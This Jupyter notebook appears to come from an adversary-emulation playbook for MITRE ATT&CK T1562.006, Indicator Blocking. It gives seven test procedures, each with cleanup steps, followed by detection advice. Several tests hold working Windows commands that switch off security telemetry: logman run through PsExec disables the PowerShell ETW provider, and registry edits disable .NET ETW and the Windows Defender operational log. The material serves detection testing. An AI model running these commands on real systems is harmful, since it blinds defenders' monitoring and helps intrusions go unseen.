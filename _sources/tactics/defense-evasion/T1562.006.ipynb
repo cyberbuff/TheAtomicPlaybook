{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "34f0942f",
   "metadata": {},
   "source": "# T1562.006 - Indicator Blocking\nAn adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck)."
  },
  {
   "cell_type": "markdown",
   "id": "07297cbf",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "999c0814",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Auditing Configuration Changes on Linux Host",
    "Emulates modification of auditd configuration files\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf\nif [ -f \"/etc/auditd.conf\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e649ece3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1033457a",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nsed -i '$ d' /etc/audisp/audispd.conf\nif [ -f \"/etc/auditd.conf\" ];\nthen sed -i '$ d' /etc/auditd.conf\nelse sed -i '$ d' /etc/audit/auditd.conf\nfi\nsed -i '$ d' /etc/libaudit.conf\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f940c282",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7a312ca1",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Logging Configuration Changes on Linux Host",
    "Emulates modification of syslog configuration.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nif [ -f \"/etc/syslog.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf\nfi\nif [ -f \"/etc/rsyslog.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf\nfi\nif [ -f \"/etc/syslog-ng/syslog-ng.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf\nfi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ccbf3519",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "6bc8e6fd",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nif [ -f \"/etc/syslog.conf\" ];\nthen sed -i '$ d' /etc/syslog.conf\nfi\nif [ -f \"/etc/rsyslog.conf\" ];\nthen sed -i '$ d' /etc/rsyslog.conf\nfi\nif [ -f \"/etc/syslog-ng/syslog-ng.conf\" ];\nthen sed -i '$ d' /etc/syslog-ng/syslog-ng.conf\nfi\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3a4899a0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8837963b",
   "metadata": {},
   "source": "### Atomic Test #3 - Disable Powershell ETW Provider - Windows\nThis test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: PSExec must be installed on the machine.\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"$env:temp\\pstools\\PsExec.exe\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nstart-bitstransfer -source \"https://download.sysinternals.com/files/PSTools.zip\" -destination \"$env:temp\\PStools.zip\"\nexpand-archive -literalpath \"$env:temp\\PStools.zip\" -destinationpath \"$env:temp\\pstools\" -force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "626b9f3a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a09f3ef6",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncmd /c \"$env:temp\\pstools\\PsExec.exe\" -accepteula -i -s cmd.exe /c logman update trace \"EventLog-Application\" --p \"Microsoft-Windows-Powershell\" -ets```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "24af9ab8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "c1b1931d",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ncmd /c \"$env:temp\\pstools\\PsExec.exe\" -i -s cmd.exe /c logman update trace \"EventLog-Application\" -p \"Microsoft-Windows-Powershell\" -ets```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a61ca10a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c40c4315",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Disable .NET Event Tracing for Windows Via Registry (cmd)",
    "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ee95c65",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "497fa163",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nREG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26b9b4fd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b0e8877b",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Disable .NET Event Tracing for Windows Via Registry (powershell)",
    "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd2a6efe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "5b16dc33",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nREG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51e9c86f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "77c7cf67",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - LockBit Black - Disable the ETW Provider of Windows Defender -cmd",
    "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" /v Operational /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "033877be",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "693ad380",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" /v Operational /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1c6b4ad7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e766fad5",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - LockBit Black - Disable the ETW Provider of Windows Defender -Powershell",
    "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" -Name Operational  -PropertyType DWord -Value 0 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3dfe114",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "4a63adec",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" -Name Operational -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7bf9b876",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1fe7a881",
   "metadata": {},
   "source": "## Detection\nDetect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}</code>"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}